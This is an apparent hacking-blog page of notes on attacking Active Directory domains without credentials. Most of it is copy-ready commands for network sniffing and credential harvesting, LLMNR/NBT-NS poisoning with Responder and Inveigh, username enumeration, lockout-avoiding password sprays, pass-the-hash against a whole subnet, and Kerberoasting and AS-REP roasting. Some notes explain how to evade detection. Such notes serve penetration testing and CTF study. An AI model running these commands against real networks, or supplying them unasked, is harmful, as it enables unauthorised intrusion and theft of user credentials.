<!doctype html><html lang=en><head><title>Active Directory :: Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="** 1. Initial Enumration and Identification ** a. Wireshark sudo -E wireshark Choose the ethernet we want to sniff on
Filter for ARP protocol
Look for NETBIOS names
Look for DNS and domain names
Look for unsecure protocols such as TELNET and FTP
b. TCPdump sudo tcpdump -i eth0 -w capture.pcap Choose the ethernet we want to sniff on
Saves the output in .pcap file
c. Net-Creds sudo python net-creds.py -f capture.pcap Install net-creds Search for credentials in the .pcap file
"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/notes/active-directory/enumeration/no-credentials/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Active Directory"><meta property="og:description" content="** 1. Initial Enumration and Identification ** a. Wireshark sudo -E wireshark Choose the ethernet we want to sniff on
Filter for ARP protocol
Look for NETBIOS names
Look for DNS and domain names
Look for unsecure protocols such as TELNET and FTP
b. TCPdump sudo tcpdump -i eth0 -w capture.pcap Choose the ethernet we want to sniff on
Saves the output in .pcap file
c. Net-Creds sudo python net-creds.py -f capture.pcap Install net-creds Search for credentials in the .pcap file
"><meta property="og:url" content="https://hack.com.cy/notes/active-directory/enumeration/no-credentials/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="Active Directory"><meta property="article:section" content="MiTM"><meta property="article:published_time" content="2025-08-23 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo>Hacking Vault</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/notes/ class=breadcrumb-link>Hacking Notes</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/notes/active-directory/ class=breadcrumb-link>Active Directory Enumeration - Exploitation</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/notes/active-directory/enumeration/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>Active Directory</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/notes/active-directory/enumeration/no-credentials/>Active Directory</a></h1><div class=post-meta><time class=post-date>2025-08-23&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>4 min read (784 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/active-directory/>Active Directory</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><ul><li><a href=#a-wireshark>a. Wireshark</a></li><li><a href=#b-tcpdump>b. TCPdump</a></li><li><a href=#c-net-creds>c. Net-Creds</a></li><li><a href=#d-responder>d. Responder</a></li><li><a href=#e-utilizing-dns-to-gather-domain-controllers>e. Utilizing DNS to gather Domain Controllers</a></li><li><a href=#f-enumerating-ad-cs--ca-authority>f. Enumerating AD CS / CA Authority</a></li></ul></li></ul><ul><li><ul><li><a href=#a-from-linux>a. From Linux</a></li><li><a href=#b-from-windows>b. From Windows</a></li></ul></li></ul><ul><li><ul><li><a href=#a-kerberos>a. Kerberos</a></li><li><a href=#b-enum4linux-smb-null-session>b. enum4linux SMB NULL Session</a></li><li><a href=#c-rpcclient-smb-null-session>c. rpcclient SMB NULL Session</a></li><li><a href=#d-netexec-rid-bruteforce>d. netexec rid bruteforce</a></li><li><a href=#e-netexec-users-flag>e. netexec &ndash;users flag</a></li><li><a href=#f-ldapsearch-ldap-anonymous-bind>f. ldapsearch LDAP Anonymous bind</a></li><li><a href=#g-windapsearch-ldap-anonymous-bind>g. windapsearch LDAP Anonymous bind</a></li></ul></li></ul><ul><li><ul><li><a href=#a-rpcclient-password-spray>a. rpcclient password spray</a></li><li><a href=#b-kerberos-password-spray-safer>b. kerberos password spray (safer)</a></li><li><a href=#c-netexec-password-spray>c. netexec password spray</a></li><li><a href=#d-netexec-local-administrator-spray>d. netexec Local Administrator spray</a></li><li><a href=#e-password-spray-from-domian-joined-windows-host>e. Password Spray from domian-joined Windows-Host</a></li></ul></li></ul><ul><li><ul><li><a href=#a-kerberoast-with-user-list>a. Kerberoast with user list</a></li></ul></li></ul></nav></div><div class=post-content><div><h1 id=-1-initial-enumration-and-identification->** 1. Initial Enumration and Identification **<a href=#-1-initial-enumration-and-identification- class=hanchor arialabel=Anchor>#</a></h1><h3 id=a-wireshark>a. Wireshark<a href=#a-wireshark class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo -E wireshark
</span></span></code></pre></div><blockquote><p>Choose the ethernet we want to sniff on</p><p>Filter for <code>ARP</code> protocol</p><p>Look for NETBIOS names</p><p>Look for DNS and domain names</p><p>Look for unsecure protocols such as TELNET and FTP</p></blockquote><h3 id=b-tcpdump>b. TCPdump<a href=#b-tcpdump class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo tcpdump -i eth0 -w capture.pcap
</span></span></code></pre></div><blockquote><p>Choose the ethernet we want to sniff on</p><p>Saves the output in .pcap file</p></blockquote><h3 id=c-net-creds>c. Net-Creds<a href=#c-net-creds class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo python net-creds.py -f capture.pcap
</span></span></code></pre></div><blockquote><p>Install <a href=https://github.com/DanMcInerney/net-creds>net-creds</a>
Search for credentials in the .pcap file</p></blockquote><h3 id=d-responder>d. Responder<a href=#d-responder class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo responder -I eth0 -A
</span></span></code></pre></div><blockquote><p>Choose the ethernet we want to analyze traffic on</p><p>Analyze mode to see NBT-NS, Browser and LLMNR requests without responding</p></blockquote><h3 id=e-utilizing-dns-to-gather-domain-controllers>e. Utilizing DNS to gather Domain Controllers<a href=#e-utilizing-dns-to-gather-domain-controllers class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /etc/resolv.conf - internal domain dotpirate.local  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>dig -t SRV _gc._tcp.dotpirate.local  
</span></span><span class=line><span class=cl>dig -t SRV _ldap._tcp.dc._msdcs.dotpirate.local  
</span></span><span class=line><span class=cl>dig -t SRV _kerberos._tcp.dotpirate.local  
</span></span><span class=line><span class=cl>dig -t SRV _ldap._tcp.dotpirate.local
</span></span></code></pre></div><blockquote><p>Replace <code>dotpirate.local</code> with the domain name assigned to <code>resolv.conf</code> file</p></blockquote><h3 id=f-enumerating-ad-cs--ca-authority>f. Enumerating AD CS / CA Authority<a href=#f-enumerating-ad-cs--ca-authority class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>openssl s_client -showcerts -connect &lt;dc-ip&gt;:3269 <span class=p>|</span> openssl x509 -noout -text <span class=p>|</span> less -S 
</span></span></code></pre></div><blockquote><p>Replace <code>&lt;dc-ip></code> with the Domain Controller IP</p></blockquote><hr><h1 id=2-llmnrnbt-ns-poisoning><strong>2. LLMNR/NBT-NS Poisoning</strong><a href=#2-llmnrnbt-ns-poisoning class=hanchor arialabel=Anchor>#</a></h1><h3 id=a-from-linux>a. From Linux<a href=#a-from-linux class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo responder -I eth0
</span></span></code></pre></div><blockquote><p>Start poisoning with reposnder on default settings</p></blockquote><h3 id=b-from-windows>b. From Windows<a href=#b-from-windows class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>Import</span><span class=o>-</span><span class=n>Module</span> <span class=p>.</span><span class=err>\</span><span class=n>Inveigh</span><span class=p>.</span><span class=nf>ps1</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>Get</span><span class=o>-</span><span class=n>Command</span> <span class=n>Invoke</span><span class=o>-</span><span class=n>Inveigh</span><span class=p>).</span><span class=n>Parameters</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Invoke</span><span class=o>-</span><span class=n>Inveigh</span> <span class=n>Y</span> <span class=o>-</span><span class=n>NBNS</span> <span class=n>Y</span> <span class=o>-</span><span class=n>ConsoleOutput</span> <span class=n>Y</span> <span class=o>-</span><span class=n>FileOutput</span> <span class=n>Y</span>
</span></span></code></pre></div><blockquote><p>LLMNR and NBNS spoofing</p><p>Inveigh <a href=https://github.com/Kevin-Robertson/Inveigh#parameter-help>Documentation</a> and default options</p></blockquote><hr><h1 id=-3-username-enumeration-on-domain-controller>** 3. Username Enumeration (on Domain Controller)<a href=#-3-username-enumeration-on-domain-controller class=hanchor arialabel=Anchor>#</a></h1><h3 id=a-kerberos>a. Kerberos<a href=#a-kerberos class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ntpdate -s dotpirate.local
</span></span><span class=line><span class=cl>./kerbrute_linux_amd64 userenum -d DOTPIRATE.LOCAL --dc &lt;dc-ip&gt; wordlist.txt -o valid-ad-users.txt
</span></span></code></pre></div><blockquote><p>Make sure to synchonize time with DC</p><p>Replace domain controller IP with <code>&lt;dc-ip></code></p><p>Replace <code>wordlist.txt</code> with <a href=https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt>this</a> or with a smaller one such as <a href=https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt>this</a></p><p>Kerberos pre-authentication failures often will not trigger logs or alerts.</p><p>Download and Installed the binary from <a href=https://github.com/ropnop/kerbrute/releases>here</a></p></blockquote><h3 id=b-enum4linux-smb-null-session>b. enum4linux SMB NULL Session<a href=#b-enum4linux-smb-null-session class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>enum4linux -U &lt;dc-ip&gt;  <span class=p>|</span> grep <span class=s2>&#34;user:&#34;</span> <span class=p>|</span> cut -f2 -d<span class=s2>&#34;[&#34;</span> <span class=p>|</span> cut -f1 -d<span class=s2>&#34;]&#34;</span>
</span></span></code></pre></div><blockquote><p>Filtering the output to grab only the users.</p><p>Replace <code>&lt;dc-ip></code> with Domain Controller IP</p></blockquote><h3 id=c-rpcclient-smb-null-session>c. rpcclient SMB NULL Session<a href=#c-rpcclient-smb-null-session class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rpcclient -U <span class=s2>&#34;&#34;</span> -N &lt;dc-ip&gt;
</span></span><span class=line><span class=cl>rpcclient? $&gt; enumdomusers
</span></span></code></pre></div><blockquote><p>Utilizing RPC to enumerate valid users.</p></blockquote><h3 id=d-netexec-rid-bruteforce>d. netexec rid bruteforce<a href=#d-netexec-rid-bruteforce class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb &lt;dc-ip&gt; -u <span class=s1>&#39;&#39;</span> -p <span class=s1>&#39;&#39;</span> --rid-brute
</span></span></code></pre></div><blockquote><p>Bruteforcing rid to gather users and groups</p></blockquote><h3 id=e-netexec-users-flag>e. netexec &ndash;users flag<a href=#e-netexec-users-flag class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb &lt;dc-ip&gt; --users
</span></span></code></pre></div><blockquote><p>Gives more information that just a list of users</p></blockquote><h3 id=f-ldapsearch-ldap-anonymous-bind>f. ldapsearch LDAP Anonymous bind<a href=#f-ldapsearch-ldap-anonymous-bind class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -h &lt;dc-ip&gt; -x -b <span class=s2>&#34;DC=DOTPIRATE,DC=LOCAL&#34;</span> -s sub <span class=s2>&#34;(&amp;(objectclass=user))&#34;</span>  <span class=p>|</span> grep sAMAccountName: <span class=p>|</span> cut -f2 -d<span class=s2>&#34; &#34;</span>
</span></span></code></pre></div><blockquote><p>Utilizing ldapsearch with a custom query to gather users from the <code>SAMAccountName</code> property</p></blockquote><h3 id=g-windapsearch-ldap-anonymous-bind>g. windapsearch LDAP Anonymous bind<a href=#g-windapsearch-ldap-anonymous-bind class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./windapsearch.py --dc-ip &lt;dc-ip&gt; -u <span class=s2>&#34;&#34;</span> -U
</span></span></code></pre></div><blockquote><p><code>-u</code> flag is to spcify a user whil <code>-U</code> is to search for users.</p></blockquote><hr><h1 id=-4-password-spray->** 4. Password Spray **<a href=#-4-password-spray- class=hanchor arialabel=Anchor>#</a></h1><h3 id=a-rpcclient-password-spray>a. rpcclient password spray<a href=#a-rpcclient-password-spray class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>PASSWORD</span><span class=o>=</span><span class=s2>&#34;Welcome2025&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> u in <span class=k>$(</span>cat valid_users.txt<span class=k>)</span><span class=p>;</span> <span class=k>do</span> 
</span></span><span class=line><span class=cl>    rpcclient -U <span class=s2>&#34;</span><span class=nv>$u</span><span class=s2>%</span><span class=nv>$PASSWORD</span><span class=s2>&#34;</span> -c <span class=s2>&#34;getusername;quit&#34;</span> &lt;dc-ip&gt; <span class=p>|</span> grep Authority
</span></span><span class=line><span class=cl>    sleep <span class=m>5</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><blockquote><p>Utilizing bash for loop and rpcclient with single password</p><p><code>sleep 5</code> (or even 10–15 sec) gives breathing room and avoids triggering threshold-based lockouts.</p><p>Replace <code>&lt;dc-ip></code> with target DC</p></blockquote><h3 id=b-kerberos-password-spray-safer>b. kerberos password spray (safer)<a href=#b-kerberos-password-spray-safer class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kerbrute passwordspray -d dotpirate.local --dc &lt;dc-ip&gt; ad_users.txt  Welcome2025
</span></span></code></pre></div><blockquote><p>Kerbrute is lockout-safe by design (it only attempts Kerberos pre-auth, which doesn’t increment bad password counters in AD)</p><p>Replace <code>&lt;dc-ip></code> with target DC</p></blockquote><h3 id=c-netexec-password-spray>c. netexec password spray<a href=#c-netexec-password-spray class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb 10.10.10.11 -u users.txt -p <span class=s1>&#39;Welcome2025&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --no-bruteforce <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --ufail-limit <span class=m>3</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --gfail-limit <span class=m>10</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --jitter <span class=m>3</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -t <span class=m>1</span>
</span></span></code></pre></div><blockquote><p><code>--no-bruteforce LIMIT</code> ensures it does not try user1=password1, user2=password2, etc. (so it only sprays the single password against the whole list).</p><p><code>--ufail-limit LIMIT</code> max failures per user before it stops (e.g., &ndash;ufail-limit 3 so you don’t risk lockouts).</p><p><code>--gfail-limit LIMIT</code> global cap on failures across all attempts.</p><p><code>--jitter INTERVAL</code> adds random delays between attempts, reducing the chance of triggering lockouts.</p><p><code>-t THREADS</code> adjust concurrency (lower = slower, safer).</p></blockquote><h3 id=d-netexec-local-administrator-spray>d. netexec Local Administrator spray<a href=#d-netexec-local-administrator-spray class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb --local-auth 10.10.10.0/23 -u administrator -H 111109182de666ddd6579eb084977777 -t <span class=m>1</span> --jitter <span class=m>2</span> --fail-limit <span class=m>10</span> <span class=p>|</span> grep +
</span></span></code></pre></div><blockquote><p>Spray the hash against every host in the subnet specified</p><p>One attempt at a time with random delay between attempts</p><p><code>--fail-limit</code> to cap attempts if it’s failing everywhere</p></blockquote><h3 id=e-password-spray-from-domian-joined-windows-host>e. Password Spray from domian-joined Windows-Host<a href=#e-password-spray-from-domian-joined-windows-host class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>Import</span><span class=o>-</span><span class=n>Module</span> <span class=p>.</span><span class=err>\</span><span class=n>DomainPasswordSpray</span><span class=p>.</span><span class=n>ps1</span>
</span></span><span class=line><span class=cl><span class=n>Invoke</span><span class=o>-</span><span class=n>DomainPasswordSpray</span> <span class=o>-</span><span class=n>Password</span> <span class=n>Welcome2025</span> <span class=o>-</span><span class=n>OutFile</span> <span class=n>output</span><span class=p>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>ErrorAction</span> <span class=n>SilentlyContinue</span>
</span></span></code></pre></div><blockquote><p>Automatically generate a user list from Active Directory</p><p>Query the domain password policy</p><p>Exclude user accounts within 1 attempt of locking out</p><p>Download and Import <a href=https://github.com/dafthack/DomainPasswordSpray>DomainPasswordSpray</a></p></blockquote><h1 id=-5-kerberoasting-and-as-rep-roasting->** 5. Kerberoasting and AS-REP Roasting **<a href=#-5-kerberoasting-and-as-rep-roasting- class=hanchor arialabel=Anchor>#</a></h1><h3 id=a-kerberoast-with-user-list>a. Kerberoast with user list<a href=#a-kerberoast-with-user-list class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo impacket-GetUserSPNs -no-preauth <span class=s2>&#34;anyknownuser&#34;</span> -usersfile users.txt -dc-host &lt;dc-ip&gt; <span class=s2>&#34;dotpirate.local&#34;</span>/
</span></span></code></pre></div><blockquote><p>Request Kerberos service tickets for any service account with a Service Principal Name (SPN)</p></blockquote><h4 id=b-as-rep-roasting>b. AS-REP Roasting<a href=#b-as-rep-roasting class=hanchor arialabel=Anchor>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo impacket-GetNPUsers dotpirate.local/ -dc-ip &lt;dc-ip&gt; -request
</span></span></code></pre></div><blockquote><p>Checks if Kerberos pre-authentication is disabled.</p></blockquote><h1 id=-6-bruteforce-username-as-password->** 6. Bruteforce Username as Password **<a href=#-6-bruteforce-username-as-password- class=hanchor arialabel=Anchor>#</a></h1><ul><li>Note: IF we found valid ad users we can use the usernames as passwords *</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo netexec smb -u ad-users.txt -p ad-users.txt --no-bruteforce --continue-on-succes
</span></span></code></pre></div></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>